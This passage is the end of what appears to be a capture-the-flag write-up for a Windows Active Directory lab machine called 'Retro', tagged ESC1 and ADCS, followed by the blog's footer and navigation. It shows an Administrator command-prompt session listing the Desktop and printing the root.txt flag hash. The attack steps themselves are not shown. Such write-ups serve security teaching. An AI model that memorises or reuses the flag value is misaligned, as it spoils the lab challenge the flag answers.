+</span></span><span class="line"><span class="cl">               <span class="mi">0</span> <span class="ne">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>              <span class="mi">0</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl">              <span class="mi">14</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>   <span class="mi">5</span><span class="p">,</span><span class="mi">261</span><span class="p">,</span><span class="mi">729</span><span class="p">,</span><span class="mi">792</span> <span class="n">bytes</span> <span class="n">free</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="n">dir</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="ow">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="mi">4</span><span class="n">BCB</span><span class="o">-</span><span class="n">B13C</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="ne">Directory</span> <span class="n">of</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">05</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">04</span><span class="p">:</span><span class="mi">55</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">05</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">03</span><span class="p">:</span><span class="mi">51</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="mi">04</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">08</span><span class="p">:</span><span class="mi">11</span> <span class="n">PM</span>                <span class="mi">32</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">               <span class="mi">1</span> <span class="ne">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>             <span class="mi">32</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl">               <span class="mi">2</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>   <span class="mi">5</span><span class="p">,</span><span class="mi">261</span><span class="p">,</span><span class="mi">729</span><span class="p">,</span><span class="mi">792</span> <span class="n">bytes</span> <span class="n">free</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="n">type</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="mi">40</span><span class="n">fce9c3f09024bcab29d377ee1ed071</span></span></span></code></pre></div></div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/retro/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/retro/" data-title="Retro" data-via="z3rodol" data-hashtags="Easy,Windows,Active Directory,ESC1,ADCS"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/easy/">Easy</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/esc1/">ESC1</a>,&nbsp;<a href="/tags/adcs/">ADCS</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/retrotwo/" class="prev" rel="prev" title="RetroTwo"><i class="fas fa-angle-left" aria-hidden="true"></i>RetroTwo</a>
+            <a href="/reset/" class="next" rel="next" title="Reset">Reset<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
